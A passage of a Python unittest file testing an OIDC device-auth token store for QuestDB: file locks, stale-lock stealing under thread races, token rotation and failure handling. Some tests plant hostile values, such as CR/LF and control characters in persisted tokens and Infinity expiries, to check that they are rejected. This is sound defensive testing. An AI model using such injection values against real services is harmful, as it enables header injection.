        self.assertEqual(self.store.in_lock(self.key, action), 'result')
        self.assertTrue(seen['held'])           # held for the whole action
        self.assertFalse(os.path.exists(lock))  # released afterwards

    def test_in_lock_releases_on_exception(self):
        lock = os.path.join(self.dir, self.key.hash() + '.lock')

        def boom():
            raise OidcError('boom')

        with self.assertRaises(OidcError):
            self.store.in_lock(self.key, boom)
        self.assertFalse(os.path.exists(lock))  # released despite the exception

    def test_in_lock_degrades_when_lock_is_held(self):
        store = FileTokenStore(
            self.dir, lock_acquire_budget=0.1, lock_stale=600)
        os.makedirs(self.dir, exist_ok=True)
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        open(lock, 'w').close()  # a live peer holds it
        ran = []
        store.in_lock(self.key, lambda: ran.append(1))
        self.assertEqual(ran, [1])             # degraded: ran without the lock
        self.assertTrue(os.path.exists(lock))  # peer's lock left untouched

    def test_in_lock_steals_a_stale_lock(self):
        # lock_stale must clear _MIN_LOCK_STALE; back-date the lock well past it
        # (os.utime, instant) rather than use a tiny window, so the lock reads as
        # abandoned without a real wait.
        store = FileTokenStore(
            self.dir, lock_acquire_budget=1.0, lock_stale=_MIN_LOCK_STALE + 1)
        os.makedirs(self.dir, exist_ok=True)
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        open(lock, 'w').close()
        os.utime(lock, (time.time() - 100_000, time.time() - 100_000))  # stale
        seen = {}
        store.in_lock(self.key, lambda: seen.setdefault(
            'held', os.path.exists(lock)))
        self.assertTrue(seen['held'])           # stole it and re-created
        self.assertFalse(os.path.exists(lock))  # released afterwards

    def test_concurrent_steal_stays_exclusive_two_threads(self):
        # Two threads racing to break ONE stale lock must not both run at once:
        # the atomic rename-aside steal re-checks staleness on the moved file and
        # restores a peer's FRESH lock instead of deleting it (a blind os.remove
        # would let the slower thread delete the winner's just-created lock and
        # both believe they won). With two threads there is no third to exploit
        # the brief restore window, so exclusion here is reliable. (Perfect
        # exclusion under pathological N-way concurrent stealing is best-effort by
        # design — a file lock can't guarantee it without OS support; the
        # no-stale-lock serialization property is covered by
        # test_in_lock_serializes_concurrent_acquirers, and no-hang/no-leak under
        # heavier steal contention by the test below.)
        store = FileTokenStore(
            self.dir, lock_acquire_budget=2.0, lock_stale=_MIN_LOCK_STALE + 1)
        os.makedirs(self.dir, exist_ok=True)
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        open(lock, 'w').close()
        os.utime(lock, (time.time() - 100_000, time.time() - 100_000))  # stale
        counter_lock = threading.Lock()
        active = [0]
        max_seen = [0]
        ran = [0]

        def action():
            with counter_lock:
                active[0] += 1
                max_seen[0] = max(max_seen[0], active[0])
            time.sleep(0.02)
            with counter_lock:
                active[0] -= 1
                ran[0] += 1

        threads = [threading.Thread(
            target=lambda: store.in_lock(self.key, action)) for _ in range(2)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)
        for t in threads:
            self.assertFalse(t.is_alive(), 'a steal-contest thread deadlocked')
        self.assertEqual(ran[0], 2)             # both actions ran
        self.assertEqual(max_seen[0], 1)        # never two at once
        self.assertFalse(os.path.exists(lock))  # released; no leftover

    def test_concurrent_steal_does_not_hang_or_leak(self):
        # Many threads racing to break ONE stale lock must not deadlock, must all
        # eventually run, and must leave no lock or `.stale.` temp file behind
        # (the steal renames aside and either removes a confirmed-stale file or
        # restores a fresh one — never orphaning a temp). This stresses the steal
        # path under contention; exclusion under that contention is best-effort
        # (see the two-thread test above), so this asserts the guarantees that
        # always hold.
        store = FileTokenStore(
            self.dir, lock_acquire_budget=10.0, lock_stale=_MIN_LOCK_STALE + 1)
        os.makedirs(self.dir, exist_ok=True)
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        open(lock, 'w').close()
        os.utime(lock, (time.time() - 100_000, time.time() - 100_000))  # stale
        ran = [0]
        counter_lock = threading.Lock()

        def action():
            with counter_lock:
                ran[0] += 1
            time.sleep(0.01)

        threads = [threading.Thread(
            target=lambda: store.in_lock(self.key, action)) for _ in range(8)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)
        self.assertFalse(any(t.is_alive() for t in threads))  # no deadlock
        self.assertEqual(ran[0], 8)                           # all ran
        self.assertFalse(os.path.exists(lock))                # lock cleaned up
        self.assertEqual(                                     # no temp leak
            [n for n in os.listdir(self.dir) if '.stale.' in n], [])

    def test_steal_recheck_does_not_delete_a_lock_that_became_fresh(self):
        # The core of the atomic steal, tested deterministically: if a lock is
        # judged stale by the acquire-loop check but turns out FRESH by the time
        # it is moved aside (a peer recreated it — exactly the TOCTOU the original
        # blind os.remove(lock) mishandled), it must be restored, never deleted,
        # and we must NOT acquire over the live peer. Drive that race with a
        # stubbed _is_stale: "stale" to the first (acquire-loop) check, "fresh" to
        # the post-rename re-check.
        store = FileTokenStore(
            self.dir, lock_acquire_budget=0.2, lock_stale=_MIN_LOCK_STALE + 1)
        os.makedirs(self.dir, exist_ok=True)
        lock = os.path.join(self.dir, self.key.hash() + '.lock')
        with open(lock, 'w') as f:
            f.write('PEER')  # a peer's fresh (live) lock, with a marker
        calls = [0]

        def fake_is_stale(_):
            calls[0] += 1
            return calls[0] == 1  # stale to the acquire check, fresh on re-check

        with mock.patch.object(store, '_is_stale', fake_is_stale):
            held = store._acquire_lock(lock)
        self.assertFalse(held)                 # deferred to the peer, did not steal
        self.assertTrue(os.path.exists(lock))  # peer's live lock not destroyed
        with open(lock) as f:
            self.assertEqual(f.read(), 'PEER')  # restored intact, not overwritten

    def test_in_lock_serializes_concurrent_acquirers(self):
        # The O_CREAT|O_EXCL lock file must actually serialize two real threads
        # sharing one store + key: with an acquire budget generous relative to
        # the tiny holds (so neither degrades to the lock-free path), no two
        # actions ever overlap. This exercises the serialization PROPERTY the
        # lock exists for, which the other in_lock tests (single-threaded, with a
        # hand-placed lock file) do not.
        store = FileTokenStore(self.dir, lock_acquire_budget=10.0, lock_stale=600)
        os.makedirs(self.dir, exist_ok=True)
        counter_lock = threading.Lock()
        active = [0]
        max_seen = [0]
        ran = [0]

        def action():
            with counter_lock:
                active[0] += 1
                max_seen[0] = max(max_seen[0], active[0])
            time.sleep(0.02)
            with counter_lock:
                active[0] -= 1
                ran[0] += 1

        threads = [threading.Thread(target=lambda: store.in_lock(self.key, action))
                   for _ in range(6)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(30)
        # Bounded join + is_alive so a serialization/deadlock regression fails
        # cleanly here instead of hanging the whole suite on an unbounded join.
        for t in threads:
            self.assertFalse(t.is_alive(), 'in_lock serialization deadlocked')
        self.assertEqual(ran[0], 6)         # all actions ran
        self.assertEqual(max_seen[0], 1)    # never two at once

    def test_non_finite_and_negative_millis(self):
        # json.loads accepts bare NaN / Infinity; a hand-edited or hostile file
        # must not smuggle a non-finite timestamp into the expiry math. Non-finite
        # reads as 0.0 (expired); a finite negative value passes through (it is
        # rejected later by TokenSet.is_valid, which treats expires_at <= 0 as
        # expired), and non-numeric / bool read as 0.0.
        self.assertEqual(_millis_to_seconds(float('nan')), 0.0)
        self.assertEqual(_millis_to_seconds(float('inf')), 0.0)
        self.assertEqual(_millis_to_seconds(float('-inf')), 0.0)
        self.assertEqual(_millis_to_seconds(-5000), -5.0)
        self.assertEqual(_millis_to_seconds('x'), 0.0)
        self.assertEqual(_millis_to_seconds(True), 0.0)
        # End to end: a file with an Infinity expiry loads as expired (0.0), not
        # as a token valid forever.
        with open(self._file(), 'w') as fh:
            fh.write('{"v":1,"client_id":"questdb",'
                     '"token_endpoint":"https://idp:443/token",'
                     '"device_authorization_endpoint":"https://idp:443/device",'
                     '"scope":"openid","groups_in_token":false,'
                     '"refresh_token":"RT","access_token":"AT","id_token":"IT",'
                     '"expires_at_millis":Infinity,"token_ttl_millis":Infinity}')
        got = self.store.load(self.key)
        self.assertEqual(got.expires_at, 0.0)
        self.assertEqual(got.token_ttl, 0.0)

    def test_seconds_to_millis_maps_non_finite_to_zero(self):
        # Inverse of _millis_to_seconds: a finite value scales to millis; a
        # non-finite / non-numeric / bool maps to 0 (expired), so the serializer
        # can't raise a raw OverflowError/ValueError on it.
        self.assertEqual(_seconds_to_millis(3.6), 3600)
        self.assertEqual(_seconds_to_millis(0.0), 0)
        self.assertEqual(_seconds_to_millis(-5.0), -5000)
        self.assertEqual(_seconds_to_millis(float('inf')), 0)
        self.assertEqual(_seconds_to_millis(float('-inf')), 0)
        self.assertEqual(_seconds_to_millis(float('nan')), 0)
        # Finite, but 1e306 * 1000 overflows to inf: the finiteness check must run
        # AFTER the scale, else int(round(inf)) raises a raw OverflowError.
        self.assertEqual(_seconds_to_millis(1e306), 0)
        self.assertEqual(_seconds_to_millis('x'), 0)
        self.assertEqual(_seconds_to_millis(True), 0)

    def test_save_non_finite_expiry_does_not_raise(self):
        # PersistedToken is public, so a direct caller can pass a non-finite
        # expiry. save() must keep the OidcError contract (not raise a raw
        # OverflowError from int(round(inf)) / ValueError from round(nan)) and
        # store it as expired (0), symmetric with the load side.
        self.store.save(self.key, self._pt(
            expires_at=float('inf'), token_ttl=float('nan')))
        got = self.store.load(self.key)
        self.assertEqual(got.expires_at, 0.0)
        self.assertEqual(got.token_ttl, 0.0)
        self.assertEqual(got.refresh_token, 'RT')  # the rest still round-trips

    def test_schema_version_and_canonical_prefix_are_linked(self):
        # The on-disk 'v' field and the hash-prefix version are derived from one
        # constant, so they can't drift apart on a future format bump.
        self.assertEqual(_CANONICAL_PREFIX, f'questdb-oidc-token-v{_SCHEMA_VERSION}')

    def test_round_trip_ipv6_endpoint(self):
        # An IPv6-endpoint identity round-trips: the bracketed canonical form is
        # stored and re-matched on load.
        key = TokenStoreKey(
            'questdb', 'https://[::1]:443/token', 'https://[::1]:443/device',
            'openid', None, False)
        self.store.save(key, self._pt())
        self.assertEqual(self.store.load(key).refresh_token, 'RT')


class _FakeStore(TokenStore):
    """An in-memory TokenStore for the auth-level persistence tests.

    Persists a single PersistedToken across simulated restarts and counts the
    SPI calls, so a test can assert that a restart resumed without a device flow.
    """

    def __init__(self):
        self.saved = None
        self.saves = 0
        self.loads = 0
        self.clears = 0
        self.in_locks = 0
        self.fail_save = False
        self.fail_clear = False
        self.fail_in_lock = False
        # Optional override: load_fn(loads_count) -> PersistedToken | None, so a
        # test can model a peer that refreshes between two loads.
        self.load_fn = None

    def load(self, key):
        self.loads += 1
        if self.load_fn is not None:
            return self.load_fn(self.loads)
        return self.saved

    def save(self, key, token):
        self.saves += 1
        if self.fail_save:
            raise OidcError('simulated disk failure')
        self.saved = token

    def clear(self, key):
        self.clears += 1
        if self.fail_clear:
            raise OidcError('simulated clear failure')
        self.saved = None

    def in_lock(self, key, action):
        self.in_locks += 1
        if self.fail_in_lock:
            # Model a custom store whose lock backend fails. The contract says a
            # raised store failure is non-fatal; OidcDeviceAuth must degrade, not
            # abort token().
            raise OidcError('simulated lock failure')
        return action()


class _CountingFileStore(FileTokenStore):
    """The REAL FileTokenStore, counting in_lock entries.

    Lets an auth-level test assert that a coordinated refresh persists the
    rotated token INLINE (one in_lock for the whole read-refresh-write) rather
    than re-acquiring the lock it already holds for the nested save — the
    _store_lock_held guard. _FakeStore can't catch that regression: it no-ops the
    real lock.
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.in_lock_calls = 0

    def in_lock(self, key, action):
        self.in_lock_calls += 1
        return super().in_lock(key, action)


class _RaiseAfterActionStore(_FakeStore):
    """A custom store whose in_lock RAISES after action() has already run.

    Models a real-world custom TokenStore whose lock-RELEASE fails after the
    coordinated refresh already succeeded (e.g. a Redis/Consul lock whose
    release call throws). The action's refresh has, on a rotating IdP, already
    consumed the old refresh token by then, so the caller must NOT re-refresh
    with it. Exercises the post-action fall-through in _try_refresh_coordinated.
    """

    def in_lock(self, key, action):
        self.in_locks += 1
        action()  # the coordinated refresh runs (and rotates the token) here
        raise OidcError('simulated lock-release failure after refresh')


class TestPersistence(AuthTestBase):
    """OidcDeviceAuth wired to a TokenStore (opt-in persistence)."""

    def _restart(self):
        # Simulate a process restart: the on-disk/fake store survives, but the
        # process-global in-memory cache does not — so the next instance must
        # resume from the store, not the shared MemoryCache.
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        _MEMORY_INFLIGHT.clear()

    def _reset_server_counters(self):
        self.state.device_requests = 0
        self.state.token_requests = []
        self.state.refresh_requests = 0
        self.state.refresh_forms = []

    def test_sign_in_persists_token(self):
        store = _FakeStore()
        auth = self.make_auth(token_store=store)
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(store.saves, 1)
        self.assertEqual(store.saved.refresh_token, 'REFRESH-1')
        self.assertEqual(store.saved.id_token, ID_TOKEN)

    def test_no_store_means_no_persistence(self):
        # Default behaviour is unchanged: no store, nothing persisted.
        auth = self.make_auth()
        self.assertIsNone(auth._token_store)
        self.assertIsNone(auth._store_key)
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_restart_with_valid_token_is_zero_network(self):
        store = _FakeStore()
        self.make_auth(token_store=store).token()  # sign in, persist
        self._restart()
        self._reset_server_counters()
        # Fresh instance + fresh clock: the persisted token is still valid.
        auth = self.make_auth(token_store=store, clock=FakeClock())
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 0)   # no re-prompt
        self.assertEqual(self.state.token_requests, [])   # no poll
        self.assertEqual(self.state.refresh_requests, 0)  # no refresh either

    def test_restart_with_expired_token_refreshes_silently(self):
        store = _FakeStore()
        self.make_auth(token_store=store).token()  # sign in, persist
        self._restart()
        self._reset_server_counters()
        # The persisted access/id token has expired, but the refresh token is
        # valid: resume with one silent refresh, never the device flow.
        late = FakeClock()
        late.wall += 10_000
        auth = self.make_auth(token_store=store, clock=late)
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 0)   # no re-prompt
        self.assertEqual(self.state.refresh_requests, 1)  # silent refresh
        self.assertGreaterEqual(store.in_locks, 1)        # coordinated refresh
        self.assertEqual(
            self.state.refresh_forms[0]['refresh_token'], 'REFRESH-1')

    def test_token_works_as_first_call_after_restore(self):
        # No explicit sign-in: token() is the entry point and resumes from disk.
        store = _FakeStore()
        self.make_auth(token_store=store).token()
        self._restart()
        self._reset_server_counters()
        auth = self.make_auth(token_store=store, clock=FakeClock())
        self.assertEqual(auth.token(), ID_TOKEN)  # straight from the store
        self.assertEqual(self.state.device_requests, 0)

    def test_non_rotating_refresh_writes_once(self):
        store = _FakeStore()
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()
        self.assertEqual(store.saves, 1)
        # Expire the cached token; the default refresh returns the SAME refresh
        # token, so the file is not rewritten (the on-disk one is still valid).
        clock.wall += 10_000
        auth.token()
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(store.saves, 1)  # no rewrite on a non-rotating refresh

    def test_rotating_refresh_rewrites_file(self):
        store = _FakeStore()
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()
        self.assertEqual(store.saves, 1)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2',  # rotated
            'token_type': 'Bearer', 'expires_in': 3600})
        clock.wall += 10_000
        auth.token()
        self.assertEqual(store.saves, 2)  # rewritten with the rotated token
        self.assertEqual(store.saved.refresh_token, 'REFRESH-2')

    def test_transient_refresh_error_propagates_through_lock(self):
        # A transient 5xx during a coordinated (lock-held) refresh surfaces as
        # OidcNetworkError — the refresh token is kept for a retry, not discarded
        # into a needless re-prompt — and never falls through to the device flow.
        store = _FakeStore()
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()                    # sign in, persist
        clock.wall += 10_000            # expire the access/id token
        self.state.refresh_response = (503, {'error': 'server_error'})
        with self.assertRaises(OidcNetworkError):
            auth.token()
        self.assertEqual(self.state.device_requests, 1)  # only the sign-in
        self.assertGreaterEqual(store.in_locks, 1)

    def test_custom_store_lock_failure_after_refresh_does_not_replay_token(self):
        # M2: a custom TokenStore whose in_lock RAISES after action() already ran
        # the coordinated refresh (a lock-release failure on a rotating IdP). The
        # refresh has already consumed REFRESH-1 and minted REFRESH-2, so the
        # fall-through must NOT re-refresh with the now-stale REFRESH-1 — replaying
        # a spent refresh token trips the IdP's reuse detection and revokes the
        # fresh one. It must instead return the already-refreshed token, so
        # REFRESH-1 is sent to the token endpoint exactly ONCE.
        store = _RaiseAfterActionStore()
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()                       # sign in; persists REFRESH-1
        self._reset_server_counters()
        # Rotate on refresh, so a replay would be observable as a 2nd REFRESH-1.
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2', 'token_type': 'Bearer',
            'expires_in': 3600})
        clock.wall += 10_000               # expire the access/id token
        # Succeeds via the in-lock refresh despite the post-action lock failure.
        self.assertEqual(auth.token(), ID_TOKEN)
        # The spent REFRESH-1 was sent exactly once — never replayed. (Without the
        # fall-through's re-consult it would be sent a second time here.)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(
            [f['refresh_token'] for f in self.state.refresh_forms], ['REFRESH-1'])
        self.assertEqual(self.state.device_requests, 0)  # no needless re-prompt

    def test_clear_removes_persisted_entry_and_reprompts(self):
        store = _FakeStore()
        auth = self.make_auth(token_store=store)
        auth.token()
        self.assertEqual(store.saves, 1)
        auth.clear()
        self.assertEqual(store.clears, 1)
        self.assertIsNone(store.saved)
        # A fresh instance after the clear finds nothing and re-prompts.
        self._restart()
        self._reset_server_counters()
        self.make_auth(token_store=store).token()
        self.assertEqual(self.state.device_requests, 1)
        self.assertEqual(store.saves, 2)  # the new sign-in persists again

    def test_save_failure_is_non_fatal(self):
        store = _FakeStore()
        store.fail_save = True
        auth = self.make_auth(token_store=store)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(auth.token(), ID_TOKEN)  # valid despite save failing
        self.assertEqual(store.saves, 1)              # attempted
        self.assertIn('token store save failed', err.getvalue())

    def test_load_failure_is_non_fatal(self):
        store = _FakeStore()

        def boom(_):
            raise OidcError('simulated read failure')

        store.load_fn = boom
        auth = self.make_auth(token_store=store)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(auth.token(), ID_TOKEN)  # falls back to device flow
        self.assertEqual(self.state.device_requests, 1)
        self.assertIn('token store load failed', err.getvalue())

    def test_persisted_token_with_control_char_is_rejected(self):
        # The file is attacker-writable: a served token carrying a control char
        # (a CR/LF injection vector) is rejected and the entry ignored, falling
        # back to a fresh sign-in rather than routing it onto the wire.
        store = _FakeStore()
        store.saved = PersistedToken(
            access_token=ACCESS_TOKEN, id_token='bad\x01id-token',
            refresh_token='REFRESH-1',
            expires_at=FakeClock().now() + 3600, token_ttl=3600.0)
        self._restart()
        self._reset_server_counters()
        auth = self.make_auth(token_store=store, clock=FakeClock())  # groups mode
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # rejected -> device flow

    def test_persisted_blank_token_is_rejected(self):
        # M1: the persistence path shares the wire path's blank-token guard. A
        # served token that is empty or whitespace-only reads as absent (a run of
        # spaces would otherwise pass the printable-ASCII gate), so the entry is
        # ignored and a fresh sign-in follows rather than serving "Bearer
        # <spaces>". Mirrors the control-char rejection above.
        store = _FakeStore()
        store.saved = PersistedToken(
            access_token=ACCESS_TOKEN, id_token='   ',
            refresh_token='REFRESH-1',
            expires_at=FakeClock().now() + 3600, token_ttl=3600.0)
        self._restart()
        self._reset_server_counters()
        auth = self.make_auth(token_store=store, clock=FakeClock())  # groups mode
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # rejected -> device flow

    def test_persisted_non_served_token_is_screened(self):
        # The persisted path screens BOTH wire-bindable tokens (parity with the
        # network path), not just the served one. In groups mode a valid id_token
        # is served, but a control-char access_token (non-served) is dropped to
        # None in the loaded TokenSet rather than kept and re-persisted verbatim by
        # _snapshot — so it can never reach a header / _sso password via a later
        # mode change or a future adapter that reads it.
        store = _FakeStore()
        store.saved = PersistedToken(
            access_token='bad\r\naccess', id_token=ID_TOKEN,
            refresh_token='REFRESH-1',
            expires_at=FakeClock().now() + 3600, token_ttl=3600.0)
        auth = self.make_auth(token_store=store, clock=FakeClock())  # groups mode
        self.assertEqual(auth.token(), ID_TOKEN)          # served id_token adopted
        self.assertEqual(self.state.device_requests, 0)   # entry usable, no flow
        self.assertIsNone(auth._tokens.access_token)      # non-served: screened

    def test_coordinated_refresh_adopts_peer_rotation(self):
        # Under the cross-process lock, re-reading the store sees a peer's freshly
        # rotated token and adopts it instead of POSTing a (now revoked) refresh.
        store = _FakeStore()
        now = FakeClock().now()
        expired = PersistedToken(
            access_token=ACCESS_TOKEN, id_token=ID_TOKEN,
            refresh_token='REFRESH-1', expires_at=now - 10, token_ttl=3600.0)
        fresh = PersistedToken(
            access_token=ACCESS_TOKEN, id_token=ID_TOKEN,
            refresh_token='REFRESH-2', expires_at=now + 3600, token_ttl=3600.0)
        # 1st load (lazy) sees the expired entry; 2nd load (re-read under the
        # lock) sees the peer's fresh, rotated entry.
        store.load_fn = lambda n: expired if n == 1 else fresh
        auth = self.make_auth(token_store=store, clock=FakeClock())
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 0)  # adopted, no network
        self.assertEqual(store.in_locks, 1)
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-2')

    def test_timeout_cap_rejected(self):
        # The HTTP timeout is capped so a slow refresh can't outlast the file
        # store's lock-staleness window.
        with self.assertRaises(OidcConfigError):
            self.make_auth(timeout=300)

    def test_store_key_built_from_canonical_config(self):
        store = _FakeStore()
        auth = self.make_auth(token_store=store, groups_in_token=True)
        key = auth._store_key
        self.assertEqual(key.client_id, 'questdb')
        self.assertTrue(key.token_endpoint.endswith('/token'))
        # Explicit numeric port in the authority (a bare ':' would also match the
        # scheme, so assert a port follows the host).
        self.assertRegex(key.token_endpoint, r'://[^/]+:\d+/')
        self.assertTrue(key.groups_in_token)
        # 'openid' is auto-added in groups mode and is part of the identity.
        self.assertIn('openid', key.scope)

    def test_control_char_in_served_token_rejected_access_mode(self):
        # The served-token character screen must also fire when the server does
        # NOT expect groups in the token: token() then serves the access_token, so
        # a control char there (a CR/LF / header-injection vector) must reject the
        # whole entry and fall back to a fresh sign-in. Mirrors the groups-mode
        # test, covering the other branch of the served-kind selection.
        store = _FakeStore()
        store.saved = PersistedToken(
            access_token='bad\x01access-token', id_token=ID_TOKEN,
            refresh_token='REFRESH-1',
            expires_at=FakeClock().now() + 3600, token_ttl=3600.0)
        self._restart()
        self._reset_server_counters()
        auth = self.make_auth(
            token_store=store, groups_in_token=False, clock=FakeClock())
        self.assertEqual(auth.token(), ACCESS_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # rejected -> device flow

    def test_clear_failure_is_non_fatal(self):
        # A store that raises on clear() must not break OidcDeviceAuth.clear():
        # it warns to stderr and carries on (the in-memory/process cache is still
        # cleared). Mirrors save/load being best-effort.
        store = _FakeStore()
        store.fail_clear = True
        auth = self.make_auth(token_store=store)
        auth.token()
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            auth.clear()  # must not raise despite the store failing
        self.assertEqual(store.clears, 1)
        self.assertIn('token store clear failed', err.getvalue())

    def test_disk_persist_skipped_when_generation_bumped(self):
        # The disk save honors the same clear()-generation as the shared-cache
        # write: if a concurrent clear() bumped the generation between the cache
        # CAS and the save, _save_if_current skips it, so the file the clear()
        # deleted is not resurrected.
        store = _FakeStore()
        auth = self.make_auth(token_store=store)
        auth.token()                       # sign in, persist once
        self.assertEqual(store.saves, 1)
        key = auth.cache_key
        # A concurrent clear() bumps the generation while an acquisition is in
        # flight (generation() marks it in-flight, so clear() bumps, not prunes).
        stale = auth._cache.generation(key)
        auth._cache.clear(key)
        try:
            auth._save_if_current(stale, 'SOME-RT')
        finally:
            auth._cache.release(key)
        self.assertEqual(store.saves, 1)   # save skipped: clear() won
        # Sanity: with the current generation it WOULD save.
        current = auth._cache.generation(key)
        try:
            auth._save_if_current(current, 'SOME-RT2')
        finally:
            auth._cache.release(key)
        self.assertEqual(store.saves, 2)

    # -- end-to-end with the REAL FileTokenStore --------------------------------
    # The tests above wire a _FakeStore whose in_lock no-ops, so the real
    # on-disk file, the cross-process lock, and the under-lock save are never
    # exercised together through OidcDeviceAuth. These drive the real store.

    def _file_store_dir(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, ignore_errors=True)
        return d

    def test_real_file_store_round_trips_across_restart(self):
        d = self._file_store_dir()
        auth = self.make_auth(token_store=FileTokenStore.at(d))
        self.assertEqual(auth.token(), ID_TOKEN)       # sign in, persist to disk
        json_files = [n for n in os.listdir(d) if n.endswith('.json')]
        self.assertEqual(len(json_files), 1)           # one file on disk
        self._restart()                                # drop the in-memory cache
        self._reset_server_counters()
        auth2 = self.make_auth(
            token_store=FileTokenStore.at(d), clock=FakeClock())
        self.assertEqual(auth2.token(), ID_TOKEN)      # resumed from disk
        self.assertEqual(self.state.device_requests, 0)   # no re-prompt
        self.assertEqual(self.state.refresh_requests, 0)  # token still valid

    def test_real_file_store_rotating_refresh_saves_inline_under_lock(self):
        # A rotating refresh persists the rotated token through the REAL lock via
        # the coordinated path, saving INLINE rather than re-acquiring the lock it
        # already holds. Assert the rotated token reached disk AND that the
        # refresh took exactly ONE further in_lock (the coordination); a
        # _store_lock_held regression would re-enter in_lock for the nested save.
        d = self._file_store_dir()
        store = _CountingFileStore.at(d)
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()                                   # sign in: 1 in_lock (save)
        self.assertEqual(store.in_lock_calls, 1)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2', 'token_type': 'Bearer',
            'expires_in': 3600})
        clock.wall += 10_000                           # expire -> coordinated
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(store.in_lock_calls, 2)       # +1 coordination, save inline
        self.assertEqual(
            store.load(auth._store_key).refresh_token, 'REFRESH-2')  # on disk

    # -- custom-store in_lock failures are best-effort (non-fatal) --------------

    def test_in_lock_failure_is_non_fatal_on_sign_in(self):
        # A custom store whose in_lock raises (its lock backend failed) must not
        # break a completed sign-in: persistence is best-effort, so token() warns
        # and returns the valid in-memory token. (The bundled FileTokenStore
        # degrades internally and never raises here.)
        store = _FakeStore()
        store.fail_in_lock = True
        auth = self.make_auth(token_store=store)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(auth.token(), ID_TOKEN)
        self.assertIn('token store', err.getvalue())

    def test_in_lock_failure_degrades_refresh_to_lock_free(self):
        # If in_lock raises on the coordinated-refresh path, degrade to a
        # lock-free refresh rather than abort: the silent refresh still happens
        # and token() is served, never a needless device-flow re-prompt. Also
        # exercises the second guarded site (the save's in_lock then fails too and
        # is swallowed).
        store = _FakeStore()
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()                       # sign in (in_lock still works)
        store.fail_in_lock = True          # now the lock backend fails
        clock.wall += 10_000               # expire -> needs a refresh
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)  # refreshed lock-free
        self.assertEqual(self.state.device_requests, 1)   # only the sign-in
        self.assertIn('token store', err.getvalue())

    def test_coordinated_refresh_uses_in_memory_token_when_newer_than_disk(self):
        # M4 / _refresh_under_lock: when a prior save FAILED, the in-memory
        # refresh token is NEWER than the last-persisted one. A coordinated
        # refresh must then refresh with the in-memory token and must NOT re-read
        # the store and regress to the stale on-disk token (which, on a rotating
        # IdP, may already be revoked). Exercises the
        # `refresh_token != _last_persisted_refresh_token` branch.
        store = _FakeStore()
        clock = FakeClock()
        auth = self.make_auth(token_store=store, clock=clock)
        auth.token()                                   # sign in: in-mem & disk RT-1
        self.assertEqual(store.saved.refresh_token, 'REFRESH-1')

        # First refresh rotates to REFRESH-2, but the save FAILS — so in-memory is
        # REFRESH-2 while the store and _last_persisted_refresh_token stay -1.
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-2', 'token_type': 'Bearer',
            'expires_in': 3600, 'scope': 'openid groups'})
        store.fail_save = True
        clock.wall += 10_000                           # expire -> refresh
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-2')        # in-mem
        self.assertEqual(auth._last_persisted_refresh_token, 'REFRESH-1')  # save failed
        self.assertEqual(store.saved.refresh_token, 'REFRESH-1')         # disk stale

        # Second refresh: in-memory (-2) != last-persisted (-1), so the coordinated
        # path skips the under-lock re-read and refreshes with the in-memory -2,
        # NOT the stale disk -1.
        store.fail_save = False
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-3', 'token_type': 'Bearer',
            'expires_in': 3600, 'scope': 'openid groups'})
        loads_before = store.loads
        clock.wall += 10_000                           # expire again -> refresh
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(
            self.state.refresh_forms[-1]['refresh_token'], 'REFRESH-2')
        self.assertEqual(store.loads, loads_before)    # re-read skipped
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-3')

    def test_clear_in_lock_failure_is_non_fatal(self):
